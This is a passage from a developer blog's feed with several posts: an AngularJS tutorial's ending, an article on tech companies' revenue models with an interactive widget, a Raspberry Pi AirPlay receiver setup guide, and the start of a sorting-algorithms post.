<h1 id="What‚Äôs-next">What‚Äôs next?<a href="#What‚Äôs-next" class="headerlink" title="What‚Äôs next?"></a></h1><p>Congrats! You have completed part 1 of this <a href="/tags/Tutorial-MEAN-Stack/">3 part series</a>. We are going to build upon the things learned in here, in the next post we are going to setup a backend in NodeJS and MongoDB and connect it to AngularJS to provide a full featured CRUD app. Continue with:</p>
<ul>
<li><p>Part II - <a href="/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/">NodeJS/ExpressJS and MongoDB/Mongoose</a></p>
</li>
<li><p>Part III - <a href="/blog/2014/10/03/mean-stack-tutorial-mongodb-expressjs-angularjs-nodejs/">MEAN Stack: Wiring all together</a></p>
</li>
</ul>
<p>I also have created BackboneJS tutorials check it out:</p>
<ul>
<li><a href="/blog/categories/backbonejs">BackboneJS Tutorials</a></li>
</ul>
<h3 id="ng-test">ng-test<a href="#ng-test" class="headerlink" title="ng-test"></a></h3><p>Congrats, you have reached this far! It is time to test what you have learned. Test-Driven Learning (TDL) ;). Here‚Äôs the challenge: open <a href="https://gist.githubusercontent.com/amejiarosario/26751cb85d088fd59c28/raw/c2dde0797c8d47d359c2137fc9a15a9228c272ca/index.html" target="_blank">this file</a> on your favorite code editor. Copy the boilerplate code and built the full app that we just build in the previous examples. Of course, you can take a peek from time to time if you get stuck ;)</p>
<p>Download this file as‚Ä¶:</p>
<p><a href="https://gist.githubusercontent.com/amejiarosario/26751cb85d088fd59c28/raw/c2dde0797c8d47d359c2137fc9a15a9228c272ca/index.html" target="_blank" rel="noopener">index.html</a></p>
<p>-OR-</p>
<p>Fork and edit online:</p>
<p data-height="268" data-theme-id="0" data-slug-hash="degzC" data-default-tab="result" data-user="amejiarosario" class="codepen">See the Pen <a href="http://codepen.io/amejiarosario/pen/degzC/" target="_blank" rel="noopener">degzC</a> by Adrian Mejia (<a href="http://codepen.io/amejiarosario" target="_blank" rel="noopener">@amejiarosario</a>) on <a href="http://codepen.io" target="_blank" rel="noopener">CodePen</a>.</p>

<h3 id="ng-solution">ng-solution<a href="#ng-solution" class="headerlink" title="ng-solution"></a></h3><p>This is the full solution and you can see it <a href="https://cdn.rawgit.com/amejiarosario/068143b53e54db43ef38/raw/b703b591bc84f2d59a2a483169294e2fb232419d/ngTodo.html#/" target="_blank">live in here</a>.</p>
<script src="//gist.github.com/068143b53e54db43ef38.js"></script>
<script async src="//codepen.io/assets/embed/ei.js"></script>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This tutorial is meant to be as clear as possible. At the same time, we are going to cover the concepts that you will need most of the time. All the good stuff without the fat :)&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Technologies/Web-Development/"/>
    
    
      <category term="angular" scheme="https://adrianmejia.com/tags/angular/"/>
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="angular 1.x" scheme="https://adrianmejia.com/tags/angular-1-x/"/>
    
      <category term="Tutorial_MEAN-Stack" scheme="https://adrianmejia.com/tags/Tutorial-MEAN-Stack/"/>
    
  </entry>
  
  <entry>
    <title>How company X make money?</title>
    <link href="https://adrianmejia.com/blog/2014/03/09/how-company-x-make-money/"/>
    <id>https://adrianmejia.com/blog/2014/03/09/how-company-x-make-money/</id>
    <published>2014-03-10T01:39:42.000Z</published>
    <updated>2014-03-10T01:39:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>Have you ever wonder how the companies that offer free services make money? Such as Instagram, Evernote, Facebook, Twitter, LinkedIn, Google Maps, so on‚Ä¶ or if it is even profitable to keep free users using their services. We would go through several revenue models and hopefully, it will throw you some light next time you decide to roll your own startup.</p>
<a id="more"></a>
<p><a href="#start">TL; DR</a>: Go to the interactive company revenue checker.</p>
<h3 id="Revenues-Models">Revenues Models<a href="#Revenues-Models" class="headerlink" title="Revenues Models"></a></h3><p>Let‚Äôs start first giving some perspective what models are actually giving the most revenues. In 2013, App Store, reported that free apps brought the 71% of the revenue! Even more than paid apps‚Ä¶ how‚Äôs that even possible!?</p>
<img src="/images/revenue-breakdown.png">
<div style="clear:both"></div>

<p>(source: <a href="http://techcrunch.com/2013/03/28/in-app-purchase-revenue-hits-record-high-accounts-for-76-of-u-s-iphone-app-revenue-90-in-asian-markets/" target="_blank">techcrunch</a>)</p>
<p><link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.3/css/base/jquery.ui.all.min.css"></p>
<p><link rel="stylesheet" type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css"></p>
<link rel="stylesheet" type="text/css" href="/stylesheets/company_revenue.css">



<p>Ok, let‚Äôs discuss some revenue models to understand this. There are 3 main models:</p>
<ul>
<li><p><strong>Freemium</strong>: apps are free to download and use. However, quite often some different features are sold separately (e.g. new levels, specialized functions, remove ads, more capacity, and so on). E.g. Pandora, Hulu, Google Docs.</p>
</li>
<li><p><strong>Premium</strong>: users paid upfront a fixed price for the application. After you pay for it, you are able to download it. Usually new software updates are free. E.g. MS Office 365.</p>
</li>
<li><p><strong>Subscription</strong>: users paid a fixed price which is automatically charged every certain time. Magazines in the iOS Newsstand are a good example of this subscription based model. Subscriptions have generally lower prices than premium accounts. E.g. Netfix.</p>
</li>
</ul>
<p>Freemium is not as ‚Äúfree‚Äù as it might seem in the surface, there are indirect ways of getting revenues from it:</p>
<ul>
<li><p><strong>Advertising</strong>: the application/service is free to use, but it contains ads or  interruption banners for an couple of minutes in order to raise revenue. This model is usually applied along with freemium apps and to remove the  ads users have to pay a subscription. E.g. Spotify.</p>
</li>
<li><p><strong>Selling data</strong>:  user information and behavior inside the application is sell to interested 3rd-parties. Usually used with freemium apps and specified in the terms of used.</p>
</li>
<li><p><strong>Transaction</strong>: the application is free to use generally and charges a percentage or fixed fee with every users‚Äô transaction made. For example, it allows you to publish your item on their site for free but when you sell it, it charges you a fee. Or publish a project in a site and when it reaches certain goal a percentage fee is applied. E.g. eBay, Kickstarter.</p>
</li>
<li><p><strong>Online lead generation</strong>:  collects user‚Äôs information sometimes in an exchange of a product or service and then resell the information to companies interested indirectly. It‚Äôs different from the selling data model because the information is not sold to 3rd party directly, but indirectly. Influencing users desitions based on 3rd party companies affiliated and users‚Äô interests, likes and behaviors. E.g. Mint, LinkedIn.</p>
</li>
<li><p><strong>Donations</strong>: (it‚Äôs self-explanatory) Services/apps are free, but it encourages users to contribute throughout donations to support the development.</p>
</li>
</ul>
<p>After reading these, you might have more clues why free apps are so much win nowadays. They helped to create those million-dollar-per-day games! (remembered FlappyBird, Candycrush, Farmville‚Ä¶) In a market where there is enough competition, having a free option will take you to large numbers of users quicker and broader, because of the low barrier to entry. For instance, Whatsapp had at certain point 10k of daily downloads, after moving it to $1 it download rate drops 10 times, they finally opted for yearly subscriptions.</p>
<p>Subscription-based revenue are also a model worth doing a special mention. It brings a steady flow of income to companies and usually comes in different tiers to fulfill users need. But, it has to be flexible enough, because it might limit hard core users which might be willing to pay more for taking the product to a new level.</p>
<p> Click at the companies logos to see if their revenue models are profitable or not. You might get surprised! If some information is not accurate please leave a comment and if you are wondering about another company not listed here, let me know and I will add it :) </p>


<p><a id="start"></a></p>
<div id="company_revenue">
  <ul id="companies-holder"></ul>
</div>

<div style="clear:both"></div>

<script src="https://code.jquery.com/jquery-1.7.1.min.js" integrity="sha256-iBcUE/x23aI6syuqF7EeT/+JFBxjPs5zeFJEXxumwb0=" crossorigin="anonymous"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.10.3/jquery-ui.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/underscore.js/1.6.0/underscore-min.js"></script>

<script type="text/javascript">
  String.prototype.titleize = function() {
    return this.replace(/_/g, " ").replace(/(?:^|\s)\S/g, function(a) { return a.toUpperCase(); });
  };
</script>

<script type="text/template" id="company-icon">
  <li class="company-item">
    <a href="#<%= name %>" class="company-icon" data-company="<%= name %>" title="How does <%= name.titleize() %> make money?">
      <span>
          <img src="/images/logo_<%= name %>.png" alt="<%= name %>">
      </span>
    </a>
  </li>
</script>

<script type="text/template" id="company-detail">
  <section id="company-details-<%= name %>" class="company-details">
    <h2>How does <%= name.titleize() %> make money?</h2>
    <input type="hidden" autofocus>
    <div>
      <ul>
        <li class="advertising revenue-<%= revenues.advertising > 0 ? 'active' : 'inactive' %>"><i class="fa fa-bullhorn"></i> Advertising</li>
        <li class="freemium revenue-<%= revenues.freemium > 0? 'active' : 'inactive' %>"><i class="fa fa-users"></i> Freemium</li>
        <li class="subscribers revenue-<%= revenues.subscribers > 0 ? 'active' : 'inactive' %>"><i class="fa fa-credit-card"></i> Subscribers</li>
        <li class="premium revenue-<%= revenues.premium > 0 ? 'active' : 'inactive' %>"><i class="fa fa-money"></i> Premium</li>
        <li class="lead_gen revenue-<%= revenues.lead_gen > 0 ? 'active' : 'inactive' %>"><i class="fa fa-random"></i> Lead Gen</li>
        <li class="transactions revenue-<%= revenues.transactions > 0 ? 'active' : 'inactive' %>"><i class="fa fa-code-fork"></i> Transactions/Royalties</li>
        <li class="selling_data revenue-<%= revenues.selling_data > 0 ? 'active' : 'inactive' %>"><i class="fa fa-globe"></i> Selling Data</li>
      </ul>
    </div>
    <div class="profitable <%= profitable ? 'active' : 'inactive' %>">
      Profitable? <%= profitable ? 'Yes' : 'No' %> <i class="fa fa-thumbs-o-<%= profitable ? 'up' : 'down' %>"></i>
      <%= revenue.length > 0 ? "<br><small>Revenue: "+revenue+"</small>" : "" %>
    </div>
    <p><small><%= description %></small></p>
    <div id="sources">
      Sources: <% _.each(sources, function(s, i){ %>
        <a href="<%= s %>" target="_blank"><%= i+1 %></a>
      <% }) %>
    </div>
  </section>
</script>

<script type="text/javascript">
var companies = [{
  name: 'instagram',
  revenues: {
    freemium: 1,
  },
  revenue: "",
  profitable: false,
  description: "Before selling to Facebook they were not making money. They are trying to incorporate Ads.",
  type: ["social-media"],
  sources: ["https://www.facebook.com/careers/department?req=a0IA000000CxvB4MAJ", "http://adage.com/article/digital/instagram-ads-a-risky-bet-facebook/244945/"]
},{
  name: 'facebook',
  revenues: {
    advertising: 0.85,
    freemium: 1,
  },
  profitable: true,
  revenue: "US$ 7.872 billion (2013)",
  description: "Advertising is the main source of revenue but also some small percentage comes from payments, web apps and other sources.",
  type: ["social-media"],
  sources: ["http://en.wikipedia.org/wiki/Facebook", "http://www.nytimes.com/2012/02/05/opinion/sunday/facebook-is-using-you.html?pagewanted=all&_moc.semityn.www&_r=0", "http://readwrite.com/2012/05/22/how-does-facebook-make-money#awesm=~oy2VCCNkvevfHC", "http://www.splatf.com/2012/02/facebook-revenue/", "http://blog.tweetsmarter.com/social-media/infographic-how-does-twitter-make-money-how-do-other-social-sites-do-it/"]
},{
  name: 'whatsapp',
  revenues: {
    advertising:0,
    freemium:1,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  profitable: true,
  revenue: "",
  description: "The company is based on Freemium model for firt year. Later, it has a subscription of $1 per year.",
  type: ["social-media"],
  sources: ["http://blogs.wsj.com/digits/2013/12/19/whatsapp-hits-400-million-users-wants-to-stay-independent/", "http://www.quora.com/WhatsApp-Messenger/How-much-revenue-is-WhatsApp-generating", "http://news.yahoo.com/whatsapp-now-making-more-money-google-play-ios-220028493.html", "http://gigaom.com/2013/07/17/why-whatsapps-new-subscription-model-makes-perfect-sense/", "http://www.buzzle.com/articles/how-does-whatsapp-make-money.html"]
},{
  name: 'twitter',
  revenues: {
    advertising: 0.85,
    freemium: 1,
  },
  profitable: true,
  revenue: "US$ 317 million (2012)",
  description: "Mostly on corporate advertising and payments from 'promoted' tweets.",
  type: ["social-media"],
  sources: ["http://blog.tweetsmarter.com/social-media/infographic-how-does-twitter-make-money-how-do-other-social-sites-do-it/", "http://www.bbc.com/news/business-24397472", ""]
},{
  name: 'kickstarter',
  revenues: {
    transactions: 1,
    // freemium: 1,
  },
  profitable: true,
  revenue: "US$ 12 million?",
  description: "Charges a 5% for successfully funded projects.",
  type: ["social-media"],
  sources: ["https://www.kickstarter.com/help", "http://qz.com/184019/how-kickstarter-users-raised-nearly-1-billion-the-really-long-tail-of-crowdfunding/"]
},{
  name: 'skype',
  revenues: {
    advertising:0,
    freemium:1,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  revenue: "US$ 740 million (2009)",
  profitable: true,
  description: "Skype-to-skype calls are free, but users can buy additional features.",
  type: ["social-media"],
  sources: ["https://support.skype.com/en/faq/FA335/how-does-skype-make-money"]
},{
  name: 'groupon',
  revenues: {
    advertising:0,
    freemium:1,
    subscribers:0,
    premium:0,
    lead_gen:0,
    transactions:1,
    selling_data:0
  },
  revenue: "US$ 2.573 billion (2013)",
  profitable: true,
  description: "Groupon takes charges a fee to seller for every deal sold. It's one of the fastest growing company in the world. Going from $30.5 million in year one to $713.4 million in year two.",
  type: ["ecommerce"],
  sources: ["http://www.reuters.com/article/2012/05/14/us-groupon-idUSBRE84D16H20120514", "http://www.incomediary.com/10-weird-ways-big-companies-make-money-online"]
},{
  name: 'ebay',
  revenues: {
    advertising:1,
    freemium:0,
    subscribers:0,
    premium:0,
    lead_gen:0,
    transactions:1,
    selling_data:0
  },
  revenue: "US$ 16.05 billion (2013)",
  profitable: true,
  description: "Fees are only applied to sellers for each transactions.",
  type: ["ecommerce"],
  sources: ["http://www.reuters.com/article/2012/05/14/us-groupon-idUSBRE84D16H20120514"]
},{
  name: 'mint',
  revenues: {
    advertising:0,
    freemium:0,
    subscribers:0,
    premium:0,
    lead_gen:1,
    transactions:0,
    selling_data:0
  },
  revenue: "",
  profitable: true,
  description: "Mint get paid a small fee when user switch to a new bank or company.",
  type: ["app"],
  sources: ["https://www.mint.com/how-it-works/free/"]
},{
  name: 'linkedin',
  revenues: {
    advertising:1,
    freemium:1,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:1
  },
  revenue: "US$1.52 billion (2013)",
  profitable: true,
  description: "Sells user's data to companies and recruiters.",
  type: ["social-media"],
  sources: ["https://intelligence.businessinsider.com/welcome"]
},{
  name: 'amazon_kindle',
  revenues: {
    advertising:0,
    freemium:0,
    subscribers:0,
    premium:1,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  revenue: "",
  profitable: false,
  description: "Amazon loses money with Kindle but at the same time makes money selling digital content on it.",
  type: ["hardware"],
  sources: [""]
},{
  name: 'microsoft_xbox',
  revenues: {
    advertising:1,
    freemium:1,
    subscribers:1,
    premium:1,
    lead_gen:0,
    transactions:1,
    selling_data:0
  },
  revenue: "",
  profitable: true,
  description: "Xbox console and games cost money (premium), charges $50 annually (subscribers) in addition to ads.",
  type: ["hardware"],
  sources: [""]
},{
  name: 'stack_overflow',
  revenues: {
    advertising:1,
    freemium:0,
    subscribers:0,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  revenue: "",
  profitable: true,
  description: "Ads, banners and sponsored results.",
  type: ["social-media"],
  sources: ["http://questions-and-answers.findthebest.com/q/17/2521/How-does-Stack-Overflow-make-money"]
},{
  name: 'netflix',
  revenues: {
    advertising:0,
    freemium:0,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  revenue: "US$4.37 billion (2013)",
  profitable: true,
  description: "Just subscribers.",
  type: ["streaming"],
  sources: [""]
},{
  name: 'pandora',
  revenues: {
    advertising:1,
    freemium:1,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  revenue: "US$274 million (2012)",
  profitable: true,
  description: "For free users presents adds, for subscribers does not.",
  type: ["streaming"],
  sources: [""]
},{
  name: 'spotify',
  revenues: {
    advertising:1,
    freemium:1,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  revenue: "",
  profitable: false,
  description: "It has been reporting loses for a couple of years due to royalty payments.",
  type: ["streaming"],
  sources: ["http://mashable.com/2012/10/05/spotify-revenues/", "http://techcrunch.com/2013/07/31/spotify-doubles-revenues-in-2012-while-losing-money-highlighting-royalty-squeeze/", "http://www.telegraph.co.uk/technology/news/10490613/Spotify-pays-500m-in-royalties-in-2013.html"]
},{
  name: 'firefox',
  revenues: {
    advertising:0,
    freemium:0,
    subscribers:0,
    premium:0,
    lead_gen:0,
    transactions:1,
    selling_data:0
  },
  revenue: "US$311 million (2012)",
  profitable: true,
  description: "Most of the income comes from royalties from the Firefox search box. Their search partners includes Google, Bing, Yahoo, Yandex, Amazon, eBay and others. Also donations and grants.",
  type: ["browser"],
  sources: ["http://www.extremetech.com/internet/92558-how-browsers-make-money-or-why-google-needs-firefox", "http://www.mozilla.org/en-US/foundation/annualreport/2012/faq/"]
},{
  name: 'craigslist',
  revenues: {
    advertising:1,
    freemium:1,
    subscribers:0,
    premium:0,
    lead_gen:0,
    transactions:1,
    selling_data:0
  },
  revenue: "US$27 million (2013)",
  profitable: true,
  description: "Ads and charging users for posting in selected categories.",
  type: ["webapps"],
  sources: ["http://www.craigslist.org/about/factsheet"]
},{
  name: 'dropbox',
  revenues: {
    advertising:0,
    freemium:1,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:1,
    selling_data:0
  },
  revenue: "US$200 million (2013)",
  profitable: true,
  description: "A fixed capacity for free, to increase it users have to subscribe.",
  type: ["webapp"],
  sources: ["http://techcrunch.com/2013/11/19/if-dropboxs-2013-revenue-is-200m-an-8b-valuation-is-pretty-steep/"]
},{
  name: 'google',
  revenues: {
    advertising:1,
    freemium:0,
    subscribers:0,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  revenue: "US$59.82 billion (2013)",
  profitable: true,
  description: "Ad products is their main source of revenue (AdSense and AdWords)",
  type: ["webapp", "search"],
  sources: ["http://blogoscoped.com/archive/2009-01-07-n84.html", "http://en.wikipedia.org/wiki/Google"]
},{
  name: 'shopify',
  revenues: {
    advertising:0,
    freemium:0,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:1,
    selling_data:0
  },
  revenue: "US$100 million?",
  profitable: true,
  description: "Ad products is their main source of revenue (AdSense and AdWords)",
  type: ["webapp", "search"],
  sources: ["http://signalvnoise.com/posts/2378-profitable-proud-shopify", "http://www.shopify.com/2013", "http://www.theglobeandmail.com/report-on-business/small-business/sb-money/business-funding/a-rare-startup-success-story-shopify-hits-1-billion-milestone/article15892998/"]
},{
  name: 'airbnb',
  revenues: {
    advertising:0,
    freemium:0,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:1,
    selling_data:0
  },
  revenue: "US$1 billion?",
  profitable: true,
  description: "Charge to travelers a fee of 6-12% and hosts pay a 3% for every booking on their site.",
  type: ["webapp", "social-media"],
  sources: ["http://www.theglobeandmail.com/report-on-business/small-business/sb-money/business-funding/a-rare-startup-success-story-shopify-hits-1-billion-milestone/article15892998/", "http://www.businessinsider.com/airbnb-billion-revenues-2013-1"]
},{
  name: 'zynga',
  revenues: {
    advertising:1,
    freemium:1,
    subscribers:0,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  revenue: "US$873.266 million (2013)",
  profitable: true,
  description: "Zynga makes money through people purchasing credits for games and also throught partnerships.",
  type: ["webapp", "games"],
  sources: ["http://www.theglobeandmail.com/report-on-business/small-business/sb-money/business-funding/a-rare-startup-success-story-shopify-hits-1-billion-milestone/article15892998/"]
},{
  name: 'world_of_warcraft',
  revenues: {
    advertising:1,
    freemium:0,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  revenue: "US$93 million (2013)",
  profitable: true,
  description: "Charges $15 per month to users. They also sends expasions packs and discs.",
  type: ["webapp", "games"],
  sources: ["http://www.theglobeandmail.com/report-on-business/small-business/sb-money/business-funding/a-rare-startup-success-story-shopify-hits-1-billion-milestone/article15892998/", "http://www.tomshardware.com/news/microtransactions-world-of-warcraft-revenues-mmorpg-in-game-store,24236.html"]
},{
  name: 'hulu',
  revenues: {
    advertising:1,
    freemium:0,
    subscribers:1,
    premium:0,
    lead_gen:0,
    transactions:0,
    selling_data:0
  },
  revenue: "US$1 billion (2013)",
  profitable: true,
  description: "Free service has Ads, limitations and restrictions, which are removed for subscribed users.",
  type: ["webapp", "streaming"],
  sources: ["http://gigaom.com/2013/12/18/hulu-2013-1-billion-in-revenue-5-million-subscribers-in-2013/"]
}];

$(function(){
  var $container = $('#companies-holder');

  _.each(companies, function printCompanies(company){
    var $company = _.template($("#company-icon").html(), company);
    $container.append($company);

    var $details = _.template($("#company-detail").html(), company);
    $container.append($details);
  });

  $(".company-icon").on('click', function(e){
    e.preventDefault();
    var name = $(this).data('company');
    var $description = $("#company-details-"+name);

    $description.dialog({
      dialogClass: "company-details-modal",
      modal: true,
      hide: { effect: "explode", duration: 300 },
    });
    $(".ui-widget-overlay").on("click", function() {  $(".ui-dialog-content").dialog().dialog("close"); });
  });
});

</script>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Have you ever wonder how the companies that offer free services make money? Such as Instagram, Evernote, Facebook, Twitter, LinkedIn, Google Maps, so on‚Ä¶ or if it is even profitable to keep free users using their services. We would go through several revenue models and hopefully, it will throw you some light next time you decide to roll your own startup.&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
    
      <category term="startups" scheme="https://adrianmejia.com/tags/startups/"/>
    
  </entry>
  
  <entry>
    <title>Cheap Airplay receiver with Raspberry Pi</title>
    <link href="https://adrianmejia.com/blog/2014/02/15/cheap-airplay-receiver-with-raspberry-pi/"/>
    <id>https://adrianmejia.com/blog/2014/02/15/cheap-airplay-receiver-with-raspberry-pi/</id>
    <published>2014-02-15T17:59:26.000Z</published>
    <updated>2014-02-15T17:59:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>I got excited about the idea of having a Raspberry Pi. It is in essence one of the smallest complete computer that you can get for $35 bucks! Ok, after I got one I had to do something useful with it‚Ä¶ So I make it a Airplay receiver to play music remotely from any of my apple devices!</p>
<a id="more"></a>
<p>There is a couple of ways to make it work. The easiest one is to install the RaspBMC, a popular media center.(<a href="http://www.raspberrypi.org/downloads" target="_blank" rel="noopener">http://www.raspberrypi.org/downloads</a>)
You can even turn it into a home theater (<a href="http://www.makeuseof.com/tag/raspberry-pi-home-theater-system/)" target="_blank" rel="noopener">http://www.makeuseof.com/tag/raspberry-pi-home-theater-system/)</a>.
However, I‚Äôm not going to explain any of those ways because just installing them gives you 99% of the functionality. As a developer, I want to have control of the computers, and I‚Äôm not afraid of the console. So, I installed Raspbian instead, which is a lightweight Ubuntu/Debian Linux optimized for Raspberry Pi.</p>
<p>#Getting started</p>
<p><strong>1. Install Raspbian ‚Äúwheezy‚Äù</strong></p>
<p>Download the image from <a href="http://www.raspberrypi.org/downloads" target="_blank" rel="noopener">http://www.raspberrypi.org/downloads</a> and follow the instructions. You have to format the SD card and ‚Äúcopy‚Äù the image. You can download this formatting tool: <a href="https://www.sdcard.org/downloads/formatter_4" target="_blank" rel="noopener">https://www.sdcard.org/downloads/formatter_4</a>. After that, plug the SD card in Raspberry, also the Ethernet cable and power cord. For more instructions follow <a href="http://lifehacker.com/5976912/a-beginners-guide-to-diying-with-the-raspberry-pi" target="_blank">http://lifehacker.com/5976912/a-beginners-guide-to-diying-with-the-raspberry-pi</a>.</p>
<p><strong>2.  Setup Pi</strong></p>
<p>You need to connect it to an HDMI display to set it up using a USB mouse and keyboard or you can use SSH if you had set that up.</p>
<p><strong>3. Access the Terminal</strong></p>
<p>From the terminal type the following commands in you Raspberry Pi:</p>
<p>Become root and update the system
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade</span><br></pre></td></tr></table></figure></p>
<p><strong>3. Setup Audio</strong></p>
<p>Audio ports could either be bind to the HDMI connection or to the audio output jack (you need sudo to execute any sound command).
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo amixer cset numid=3 1</span><br></pre></td></tr></table></figure></p>
<p>Connect the speakers to you Raspberry Pi. You can test that they work with these:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo speaker-test -t pink -l 1</span><br><span class="line">sudo speaker-test -t sine -l 1</span><br></pre></td></tr></table></figure>
<p>You can also adjust the volume
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo alsamixer</span><br></pre></td></tr></table></figure></p>
<p><strong>4. Install Airplay software</strong></p>
<p>I tested with 2 different programs, both of them did the trick for me.</p>
<ul>
<li><a href="https://github.com/juhovh/shairplay" target="_blank" rel="noopener">https://github.com/juhovh/shairplay</a></li>
<li><a href="https://github.com/abrasive/shairport" target="_blank" rel="noopener">https://github.com/abrasive/shairport</a></li>
</ul>
<p>The latter is more popular so I will give the instructions for that one:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y libssl-dev libavahi-client-dev libasound2-dev git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/abrasive/shairport.git</span><br><span class="line"><span class="built_in">cd</span> shairport</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">./shairport -a <span class="string">'AirPi'</span></span><br></pre></td></tr></table></figure>
<p><strong>5. Run Airplay (shairport) on boot.</strong></p>
<p>It‚Äôs nice to run airport receiver automatically when you connect your Pi.</p>
<p>Create a file to start shairport
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/init.d/airplay</span><br></pre></td></tr></table></figure></p>
<p>Type the following into <code>airplay</code>:</p>
<figure class="highlight bash"><figcaption><span>airplay</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin/shairport -a <span class="string">"AirPi"</span></span><br></pre></td></tr></table></figure>
<p>Close the editing mode and exit the file. Then register the script to be run on boot.
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x /etc/init.d/airplay</span><br><span class="line">update-rc.d airplay defaults</span><br></pre></td></tr></table></figure></p>
<p>Reboot your Pi and you are good to go!
(If you have any questions you can write a comment below)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;I got excited about the idea of having a Raspberry Pi. It is in essence one of the smallest complete computer that you can get for $35 bucks! Ok, after I got one I had to do something useful with it‚Ä¶ So I make it a Airplay receiver to play music remotely from any of my apple devices!&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
    
      <category term="raspberrypi" scheme="https://adrianmejia.com/tags/raspberrypi/"/>
    
  </entry>
  
  <entry>
    <title>Algorithms for dummies (Part 1): Big-O Notation and Sorting</title>
    <link href="https://adrianmejia.com/blog/2014/02/13/algorithms-for-dummies-part-1-sorting/"/>
    <id>https://adrianmejia.com/blog/2014/02/13/algorithms-for-dummies-part-1-sorting/</id>
    <published>2014-02-13T13:28:51.000Z</published>
    <updated>2014-02-13T13:28:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>After being developing software for a while,  I realized that there is a couple of ways to become better at it. One it‚Äôs through your experience: writing code, working on projects, getting hands dirty‚Ä¶ Other one it‚Äôs learning algorithms and design patterns. In other words through leveraging the experience of other computer scientists. Learning to use algorithms efficiently can instantly add to you the equivalent of 10 years of experience or more. Let‚Äôs get started and add new tools to our arsenal!</p>
<a id="more"></a>
<p>How do you know a piece of code that you just wrote is good enough?  When you modify a program, how do you know if it is better as you found it? How do scale programs to handle huge amount of data? In fact, You cannot improve what you can‚Äôt measure.</p>
<p>How to measure them? We could count the number of seconds it takes to execute and compare it with other one. However, it‚Äôs not just troublesome to timers around code but if we run it in different hardware (e.g. supercomputer) it will seem like more efficient when indeed it‚Äôs exactly the same program. Let‚Äôs illustrate a better way with an example. Let‚Äôs say you want to sort an array of n integers.</p>
<h1 id="Sorting-Algorithms">Sorting Algorithms<a href="#Sorting-Algorithms" class="headerlink" title="Sorting Algorithms"></a></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">1</span>; x &lt; arr.length; x++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> y=x; y &gt; <span class="number">0</span> &amp;&amp; arr[y-<span class="number">1</span>] &gt; arr[y]; y--)&#123;</span><br><span class="line">        <span class="keyword">int</span> t = arr[y];</span><br><span class="line">        arr[y] = arr[y-<span class="number">1</span>];</span><br><span class="line">        arr[y-<span class="number">1</span>] = t;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
